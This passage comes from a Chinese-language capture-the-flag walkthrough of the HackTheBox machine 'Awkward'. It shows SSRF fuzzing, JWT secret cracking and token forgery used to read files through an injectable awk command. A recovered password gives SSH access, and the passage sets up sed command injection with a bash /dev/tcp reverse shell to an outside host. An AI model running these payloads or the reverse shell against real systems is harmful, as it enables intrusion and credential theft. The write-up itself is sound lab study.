，这看着很像是兔子洞\n\n所以我们换个思路\n\n![](Hackthebox-Awkward/ixq6hoCufvKYUC1ZW2TOsW58PWVDMYs-0sLM54nKVnI.png)\n\n来到首页，我们点击刷新，抓这个刷新的包看看\n\n![](Hackthebox-Awkward/hVWqIl5JU58WsJDCmMGnTEQBDnXqClV-TitZyXNEje4.png)\n\n请求的包有点奇怪\n\n这个包指向了子域名 store\n\n![](Hackthebox-Awkward/jv_20INiPgVbrlp3FRYyZHwtklfwxugK227WvxWMbUo.png)\n\nok，这很明显是一个 SSRF 了，我们来 fuzz 一下\n\n## Fuzz\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ffuf -u 'http://hat-valley.htb/api/store-status?url=\"http://localhost:FUZZ\"' -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -fs 0 \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://hat-valley.htb/api/store-status?url=\"http://localhost:FUZZ\"\n :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n :: Filter           : Response size: 0\n________________________________________________\n\n0080                    [Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 290ms]\n3002                    [Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 142ms]\n8080                    [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 170ms]\n:: Progress: [10000/10000] :: Job [1/1] :: 193 req/sec :: Duration: [0:00:49] :: Errors: 0 ::\n```\n这里的 3002 和 8080 都是我们没有见过的，比较奇怪的，并且有东西的\n\n而 3002 的 size 居然有 77010 个，明显不对，我们去看一下\n\n![](Hackthebox-Awkward/qV0Ue07IjR14am1u1aKIIooiBFkQY5uO1Ky1qX4IM74.png)\n\n直接访问是空白的，我们加上双引号试试\n\n![](Hackthebox-Awkward/3lmX3BPWnjKtiD3MSe1h-dHJdJBJhjopXczCaJ9CpP0.png)\n\nnice，有东西了\n\n![](Hackthebox-Awkward/RQJrPbAxTdvycj6hIf0wvnvPePy5ArRrraGZyR0fXgk.png)\n\n发现个有趣的玩意儿，检索已登录用户的休假请求历史记录，这个接口是有 LFI 的。\n\n![](Hackthebox-Awkward/Cyc38LvM7oUkPlO17iHJS4Lv2kdGKa64EO8odaxI2ig.png)\n\n## JWT Token 利用\n这里的 awk 命令是传递用户变量的，我们可以通过控制它来达到利用的目的\n\n我们需要将用户变量更改为 `/etc/passwd` \n\nuser 变量的值是 JWT 令牌的用户名，为了让它成功利用，我们先去拿到 JWT Token 的密钥\n\n首先将 token 保存到本地\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# cat jwt                                                                           \neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc4NTUxNDU3fQ.Baca0KhSUCTjcZiDINY0mVs1Tndg78RGwXWLMpwjuZ8\n```\n然后使用 john 进行破解\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# john jwt --wordlist=/usr/share/wordlists/rockyou.txt -format=HMAC-SHA256 \nUsing default input encoding: UTF-8\nLoaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n123beany123      (?)     \n1g 0:00:00:03 DONE (2023-03-12 00:54) 0.3076g/s 4102Kp/s 4102Kc/s 4102KC/s 123erix..123P45\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\n得到了密钥\n\n然后我们去 jwt.io 进行 cookie 的伪造\n\n![](Hackthebox-Awkward/9K65eo5piospxqpwE42bSLhIb46aQiunURAzYsVPRJA.png)\n\n得到了  cookie\n\n```bash\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk\n```\n然后我们用 burp 抓包一个访问 /api/all-leave 的请求，然后把 cookie 替换为我们制作的\n\n![](Hackthebox-Awkward/h7OqA_sXJdmZFBxNvhn15FAHKB7GAVPPOjzzh2sBNQ0.png)\n\n成功利用\n\n我这个人比较懒，所以现在我们来构造一下命令行的\n\n```bash\ncurl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk\"\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# curl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk\"\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:102:105::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsyslog:x:104:111::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:115::/run/uuidd:/usr/sbin/nologin\nsystemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin\ntcpdump:x:109:117::/nonexistent:/usr/sbin/nologin\navahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\ndnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nkernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin\navahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin\ncups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin\nrtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin\nwhoopsie:x:117:124::/nonexistent:/bin/false\nsssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin\nspeech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false\nnm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin\nsaned:x:121:128::/var/lib/saned:/usr/sbin/nologin\ncolord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\ngeoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin\npulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin\ngnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false\nhplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false\ngdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false\nbean:x:1001:1001:,,,:/home/bean:/bin/bash\nchristine:x:1002:1002:,,,:/home/christine:/bin/bash\npostfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin\nmysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false\nsshd:x:130:65534::/run/sshd:/usr/sbin/nologin\n_laurel:x:999:999::/var/log/laurel:/bin/false\n```\n利用成功，现在我们来筛选一下哪些用户可以被我们利用\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# curl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk\"|grep bash\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  3059  100  3059    0     0  11835      0 --:--:-- --:--:-- --:--:-- 11856\nroot:x:0:0:root:/root:/bin/bash\nbean:x:1001:1001:,,,:/home/bean:/bin/bash\nchristine:x:1002:1002:,,,:/home/christine:/bin/bash\n```\n可以被我们利用的有三个，root、bean、christine，很明显 root 可以排除掉，那我们来尝试请求一下剩下两个的 ssh 密钥试试\n\n```bash\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY3ODU1MTQ1N30.q-l1lOtEZN_v9o2iSq6QtSAa_qy4q820aemxYDMfcKs\n\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.MUsm1gjZCMxGU1lJ6D0NRn8X_NAaVF2Mf1oZj0het5A\n```\n去尝试一下\n\n```bash\ncurl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY3ODU1MTQ1N30.q-l1lOtEZN_v9o2iSq6QtSAa_qy4q820aemxYDMfcKs\"\n\ncurl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.MUsm1gjZCMxGU1lJ6D0NRn8X_NAaVF2Mf1oZj0het5A\"\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# curl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY3ODU1MTQ1N30.q-l1lOtEZN_v9o2iSq6QtSAa_qy4q820aemxYDMfcKs\"\nFailed to retrieve leave requests                                                                                                                                                                                                                   \n┌──(root㉿kali)-[~/Desktop]\n└─# curl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.MUsm1gjZCMxGU1lJ6D0NRn8X_NAaVF2Mf1oZj0het5A\"\nFailed to retrieve leave requests\n```\n都失败了，那我们去获取一下 `.bashrc` 文件试试\n\n```bash\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.qM7H1rC2FK75T8PtsA0FfWpP47D5EIoESKpVnx4e-fg\n\ncurl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.qM7H1rC2FK75T8PtsA0FfWpP47D5EIoESKpVnx4e-fg\"\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# curl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.qM7H1rC2FK75T8PtsA0FfWpP47D5EIoESKpVnx4e-fg\"\n# ~/.bashrc: executed by bash(1) for non-login shells.\n# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)\n# for examples\n\n# If not running interactively, don't do anything\ncase $- in\n    *i*) ;;\n      *) return;;\nesac\n\n# don't put duplicate lines or lines starting with space in the history.\n# See bash(1) for more options\nHISTCONTROL=ignoreboth\n\n# append to the history file, don't overwrite it\nshopt -s histappend\n\n# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)\nHISTSIZE=1000\nHISTFILESIZE=2000\n\n# check the window size after each command and, if necessary,\n# update the values of LINES and COLUMNS.\nshopt -s checkwinsize\n\n# If set, the pattern \"**\" used in a pathname expansion context will\n# match all files and zero or more directories and subdirectories.\n#shopt -s globstar\n\n# make less more friendly for non-text input files, see lesspipe(1)\n[ -x /usr/bin/lesspipe ] && eval \"$(SHELL=/bin/sh lesspipe)\"\n\n# set variable identifying the chroot you work in (used in the prompt below)\nif [ -z \"${debian_chroot:-}\" ] && [ -r /etc/debian_chroot ]; then\n    debian_chroot=$(cat /etc/debian_chroot)\nfi\n\n# set a fancy prompt (non-color, unless we know we \"want\" color)\ncase \"$TERM\" in\n    xterm-color|*-256color) color_prompt=yes;;\nesac\n\n# uncomment for a colored prompt, if the terminal has the capability; turned\n# off by default to not distract the user: the focus in a terminal window\n# should be on the output of commands, not on the prompt\n#force_color_prompt=yes\n\nif [ -n \"$force_color_prompt\" ]; then\n    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then\n        # We have color support; assume it's compliant with Ecma-48\n        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such\n        # a case would tend to support setf rather than setaf.)\n        color_prompt=yes\n    else\n        color_prompt=\n    fi\nfi\n\nif [ \"$color_prompt\" = yes ]; then\n    PS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '\nelse\n    PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ '\nfi\nunset color_prompt force_color_prompt\n\n# If this is an xterm set the title to user@host:dir\ncase \"$TERM\" in\nxterm*|rxvt*)\n    PS1=\"\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1\"\n    ;;\n*)\n    ;;\nesac\n\n# enable color support of ls and also add handy aliases\nif [ -x /usr/bin/dircolors ]; then\n    test -r ~/.dircolors && eval \"$(dircolors -b ~/.dircolors)\" || eval \"$(dircolors -b)\"\n    alias ls='ls --color=auto'\n    #alias dir='dir --color=auto'\n    #alias vdir='vdir --color=auto'\n\n    alias grep='grep --color=auto'\n    alias fgrep='fgrep --color=auto'\n    alias egrep='egrep --color=auto'\nfi\n\n# colored GCC warnings and errors\n#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'\n\n# some more ls aliases\nalias ll='ls -alF'\nalias la='ls -A'\nalias l='ls -CF'\n\n# custom\nalias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'\n\n# Add an \"alert\" alias for long running commands.  Use like so:\n#   sleep 10; alert\nalias alert='notify-send --urgency=low -i \"$([ $? = 0 ] && echo terminal || echo error)\" \"$(history|tail -n1|sed -e '\\''s/^\\s*[0-9]\\+\\s*//;s/[;&|]\\s*alert$//'\\'')\"'\n\n# Alias definitions.\n# You may want to put all your additions into a separate file like\n# ~/.bash_aliases, instead of adding them here directly.\n# See /usr/share/doc/bash-doc/examples in the bash-doc package.\n\nif [ -f ~/.bash_aliases ]; then\n    . ~/.bash_aliases\nfi\n\n# enable programmable completion features (you don't need to enable\n# this, if it's already enabled in /etc/bash.bashrc and /etc/profile\n# sources /etc/bash.bashrc).\nif ! shopt -oq posix; then\n  if [ -f /usr/share/bash-completion/bash_completion ]; then\n    . /usr/share/bash-completion/bash_completion\n  elif [ -f /etc/bash_completion ]; then\n    . /etc/bash_completion\n  fi\nfi\n```\n```bash\n# custom\nalias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'\n```\n我们找到了一个 alias，还有一个 hash 脚本 `/home/bean/Documents/backup_home.sh` \n\n```bash\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzg1NTE0NTd9.nlTiW6mox1VXEHkf4fc_dX_pJqqtW8Srm58MNRTeSe0\n\ncurl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzg1NTE0NTd9.nlTiW6mox1VXEHkf4fc_dX_pJqqtW8Srm58MNRTeSe0\"\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# curl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzg1NTE0NTd9.nlTiW6mox1VXEHkf4fc_dX_pJqqtW8Srm58MNRTeSe0\"\n#!/bin/bash\nmkdir /home/bean/Documents/backup_tmp\ncd /home/bean\ntar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .\ndate > /home/bean/Documents/backup_tmp/time.txt\ncd /home/bean/Documents/backup_tmp\ntar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .\nrm -r /home/bean/Documents/backup_tmp\n```\n我们去下载这个文件\n\n```bash\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw\n\ncurl http://hat-valley.htb/api/all-leave --header \"Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw\" --output bean_backup_final.zip\n```\n```bash\n┌──(root㉿kali)-[~/Desktop/bean]\n└─# curl http://hat-valley.htb/api/all-leave --header \"Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw\" --output bean_backup_final.zip\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 31716  100 31716    0     0  61542      0 --:--:-- --:--:-- --:--:-- 61584\n```\n```bash\n┌──(root㉿kali)-[~/Desktop/bean]\n└─# ls\nbean_backup_final.zip\n```\n```bash\n┌──(root㉿kali)-[~/Desktop/bean]\n└─# unzip bean_backup_final.zip \nArchive:  bean_backup_final.zip\n  End-of-central-directory signature not found.  Either this file is not\n  a zipfile, or it constitutes one disk of a multi-part archive.  In the\n  latter case the central directory and zipfile comment will be found on\n  the last disk(s) of this archive.\nunzip:  cannot find zipfile directory in one of bean_backup_final.zip or\n        bean_backup_final.zip.zip, and cannot find bean_backup_final.zip.ZIP, period.\n```\n将文件解压出来\n\n```bash\n┌──(root㉿kali)-[~/Desktop/bean]\n└─# ls -la\n总计 68\ndrwxr-xr-x  6 root     root      4096  3月12日 01:26 .\ndrwxr-xr-x  3 root     root      4096  3月12日 01:17 ..\nlrwxrwxrwx  1 lucifiel lucifiel     9  9月15日 19:40 .bash_history -> /dev/null\n-rw-r--r--  1 lucifiel lucifiel   220  9月15日 19:34 .bash_logout\n-rw-r--r--  1 lucifiel lucifiel  3847  9月15日 19:45 .bashrc\n-rw-r--r--  1 root     root     31716  3月12日 01:26 bean_backup_final.zip\ndrwxr-xr-x 12 root     root      4096  3月12日 01:24 .config\ndrwxr-xr-x  2 root     root      4096  3月12日 01:24 .gnupg\ndrwxr-xr-x  3 root     root      4096  3月12日 01:24 .local\n-rw-r--r--  1 lucifiel lucifiel   807  9月15日 19:34 .profile\ndrwx------  2 lucifiel lucifiel  4096  9月15日 19:36 .ssh\n```\n这是解压出来的文件\n\n```bash\n┌──(root㉿kali)-[~/Desktop/bean/.config/xpad]\n└─# cat content-DS1ZS1 \nTO DO:\n- Get real hat prices / stock from Christine\n- Implement more secure hashing mechanism for HR system\n- Setup better confirmation message when adding item to cart\n- Add support for item quantity > 1\n- Implement checkout system\n\nboldHR SYSTEM/bold\nbean.hill\n014mrbeanrules!#P\n\nhttps://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html\n\nboldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold \n```\n在 bean/.config/xpad/content-DS1ZS1 中找到了 bean 的密码\n\n```bash\nusername = bean.hill\npassword = 014mrbeanrules!#P\n```\n尝试使用 bean 去登录 ssh\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ssh bean@10.10.11.185                      \nThe authenticity of host '10.10.11.185 (10.10.11.185)' can't be established.\nED25519 key fingerprint is SHA256:iXn1BLzsoL4oHP9bO/v5F/CKp7pdoku6nopTeJlvR3U.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.185' (ED25519) to the list of known hosts.\nbean@10.10.11.185's password: \nWelcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n0 updates can be applied immediately.\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sun Mar 12 01:59:31 2023 from 10.10.14.68\nbean@awkward:~$ whoami&&id\nbean\nuid=1001(bean) gid=1001(bean) groups=1001(bean)\n```\n成功登录到 user 用户\n\n```bash\nbean@awkward:~$ cat user.txt \n5005243124dea7c1f14fc7d933ef2946\n```\n成功拿到 user 用户的 flag 文件\n\n# 权限提升\n还记得我们的子域名 store 吗？\n\n在 burp 中的时候显示该页面来自 nginx 服务器，让我们看一下 shell 中的 nginx 配置文件\n\n```bash\nbean@awkward:~$ cd /etc/nginx/conf.d/\nbean@awkward:/etc/nginx/conf.d$ ls -la\ntotal 12\ndrwxr-xr-x 2 root root 4096 Sep 15 22:34 .\ndrwxr-xr-x 8 root root 4096 Oct  6 00:49 ..\n-rw-r--r-- 1 root root   44 Sep 15 22:34 .htpasswd\nbean@awkward:/etc/nginx/conf.d$ cat .htpasswd \nadmin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1\n```\n我们使用 john 去跑一下\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash\nWarning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\"\nUse the \"--format=md5crypt-long\" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:01:30 DONE (2023-03-12 01:34) 0g/s 156319p/s 156319c/s 156319C/s  ejngyhga007..*7¡Vamos!\nSession completed.\n```\n然而并没有结果\n\n然而我突然想起来 content-DS1ZS1 文件底部有一句注释\n\n```bash\nboldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold \n```\n大概意思就是让我们导出尝试一下\n\n```bash\nusername = admin\npassword = 014mrbeanrules!#P\n```\n使用 bean 的代码前往 [http://store.hat-valley.htb/](http://store.hat-valley.htb/) 登录 admin 账户成功\n\n![](Hackthebox-Awkward/w4xE8GRniDaZ555NGGjxG7k93o5vOMK_xI-1wrM-xBE.png)\n\n这很明显是 Hat Valley 的在线商店。我们去查看一下代码\n\n```bash\nbean@awkward:/var/www/store$ ls -la\ntotal 104\ndrwxr-xr-x 9 root root  4096 Oct  6 01:35 .\ndrwxr-xr-x 7 root root  4096 Oct  6 01:35 ..\ndrwxrwxrwx 2 root root  4096 Mar 12 01:30 cart\n-rwxr-xr-x 1 root root  3664 Sep 15 20:09 cart_actions.php\n-rwxr-xr-x 1 root root 12140 Sep 15 20:09 cart.php\n-rwxr-xr-x 1 root root  9143 Sep 15 20:09 checkout.php\ndrwxr-xr-x 2 root root  4096 Oct  6 01:35 css\ndrwxr-xr-x 2 root root  4096 Oct  6 01:35 fonts\ndrwxr-xr-x 6 root root  4096 Oct  6 01:35 img\n-rwxr-xr-x 1 root root 14770 Sep 15 20:09 index.php\ndrwxr-xr-x 3 root root  4096 Oct  6 01:35 js\ndrwxrwxrwx 2 root root  4096 Mar 12 04:30 product-details\n-rwxr-xr-x 1 root root   918 Sep 15 20:09 README.md\n-rwxr-xr-x 1 root root 13731 Sep 15 20:09 shop.php\ndrwxr-xr-x 6 root root  4096 Oct  6 01:35 static\n-rwxr-xr-x 1 root root   695 Sep 15 20:09 style.css\n```\n```bash\nbean@awkward:/var/www/store$ cat README.md \n# Hat Valley - Shop Online!\n\n### To Do\n1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup\n2. Implement checkout system, link with credit card system (Stripe??)\n3. Implement shop filter\n4. Get full catalogue of items\n\n### How to Add New Catalogue Item\n1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID\n2. Change the fields to the appropriate values and save the file.  \n-- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. --\n\n### Hat Valley Cart\nRight now, the user's cart is stored within /cart, and is named according to the user's session ID. All products are appended to the same file for each user.\nTo test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website!\n```\nREADME.md 告诉我们文件正离线存储在 /product-details 和 /cart 中\n\n在文件 cart\\_actions.php 中的一段代码\n\n```bash\n    if(checkValidItem(\"{$STORE_HOME}cart/{$user_id}\")) {\n        system(\"sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}\");\n        echo \"Item removed from cart\";\n    }\n    else {\n        echo \"Invalid item\";\n    }\n    exit;\n```\n这不就有了\n\n这段中的 sed 命令是用于从购物车文件中删除数据\n\n我们可以利用这个代码来进行远程代码执行\n\n首先我们需要一个 Reverse Shell\n\n```bash\necho \"bash -i >& /dev/tcp/10.10.16.26/4444 0>&1\" >> /tmp/shell.sh\nchmod 777 /tmp/shell.sh\n\nbean@awkward:/var/www/store/cart$ cat /tmp/shell.sh \n#!/bin/bash\nbash -i >& /dev/tcp/10.10.16.26/4444 0>&1\n```\n```bash\nnc -nvlp 